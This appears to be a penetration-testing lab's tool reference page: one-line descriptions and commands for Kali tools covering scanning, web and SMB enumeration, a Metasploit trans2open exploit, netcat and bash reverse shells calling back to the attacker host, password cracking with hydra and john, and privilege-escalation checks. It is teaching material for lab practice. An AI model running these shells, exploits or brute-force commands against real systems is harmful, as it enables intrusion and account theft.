# The Toolkit

Every tool below ships with **Kali Linux**. This page gives the one-line "what it
is", a typical command, and how to read the output. Walkthroughs reference these
tools directly.

---

## Reconnaissance

### `ip a` — show your own network interfaces
```bash
ip a
```
Lists interfaces and addresses. Note your lab IP (e.g. `192.168.56.10/24`).

### `arp-scan` — discover live hosts (layer 2)
```bash
sudo arp-scan --interface=eth0 --localnet
```
Faster and stealthier than a ping sweep; finds hosts that ignore ICMP.

### `netdiscover` — passive/active host discovery
```bash
sudo netdiscover -r 192.168.56.0/24
```
Good when you don't know the subnet. `-r` sets the range.

### `nmap` — the port scanner
```bash
sudo nmap -sn 192.168.56.0/24                 # host discovery
sudo nmap -p- --min-rate 1000 192.168.56.101  # all TCP ports, fast
sudo nmap -sC -sV -p 22,80,445 192.168.56.101 # default scripts + versions
sudo nmap -sU --top-ports 50 192.168.56.101   # common UDP ports
```
Reading the output:
- `open` = a service is listening → attack surface.
- `-sV` prints product + version → search that version for CVEs.
- `-sC` prints banners/scripts (e.g. SMB shares, HTTP titles).

---

## Enumeration

### Web
```bash
whatweb http://192.168.56.101        # tech fingerprint
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://192.168.56.101/FUZZ
gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirb/common.txt
nikto -h http://192.168.56.101       # quick web vulnerability scan
```
`ffuf`/`gobuster` brute-force file/directory names; `FUZZ` marks the injection point.

### SMB / Samba
```bash
enum4linux -a 192.168.56.101
smbclient -L //192.168.56.101 -N
smbmap -H 192.168.56.101
```
Lists shares, users, OS info. `-N` = no password (null session).

### FTP / SSH
```bash
ftp 192.168.56.101        # try anonymous / anonymous
ssh user@192.168.56.101
```

### DNS / NetBIOS / SNMP
```bash
dnsrecon -d target.local
nmap --script nbstat 192.168.56.101
snmpwalk -c public -v1 192.168.56.101
```

---

## Exploitation

### Search for known exploits
```bash
searchsploit samba 2.2
```

### Metasploit
```bash
msfconsole
msf6 > search trans2open
msf6 > use exploit/linux/samba/trans2open
msf6 > set RHOSTS 192.168.56.101
msf6 > set PAYLOAD linux/x86/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.56.10
msf6 > run
```

### Netcat — the Swiss army knife
```bash
nc -lvnp 4444              # listener (your Kali)
nc -e /bin/bash 192.168.56.10 4444   # (target side, if supported)
```

### Reverse shell cheat
```bash
bash -i >& /dev/tcp/192.168.56.10/4444 0>&1
```

### Upgrade a dumb shell to a real TTY
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm; export SHELL=/bin/bash
```

---

## Passwords

```bash
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.101
```
`john`/`hashcat` crack hashes offline; `hydra` brute-forces live services
(use sparingly — many boxes lock you out).

---

## Privilege escalation (Linux)

```bash
sudo -l                         # what may I run as root?
find / -perm -4000 -type f 2>/dev/null   # SUID binaries
getcap -r / 2>/dev/null         # binaries with capabilities
cat /etc/crontab; ls -la /etc/cron*      # scheduled jobs
uname -a; cat /etc/os-release   # kernel / distro (for kernel exploits)
find / -writable -user root -type f 2>/dev/null
```

Auto-enumerators (run, then verify manually):
```bash
./linpeas.sh
./LinEnum.sh
```

Reference: [GTFOBins](https://gtfobins.github.io/) — how to abuse common
binaries for privesc.

---

## Windows equivalent (for Windows targets)

```powershell
whoami /priv
systeminfo
.\winPEAS.exe
AccessChk.exe /accepteula -uwcqv "Authenticated Users" *
```

---

## Wordlists you will reuse

| Path | Use |
| --- | --- |
| `/usr/share/wordlists/dirb/common.txt` | directory brute-force |
| `/usr/share/wordlists/rockyou.txt` | password cracking |
| `/usr/share/seclists/` | a huge collection (install `seclists`) |

---

_Back to the [README](../README.md) · [Lab setup](LAB-SETUP.md) · [Catalog](CATALOG.md)._
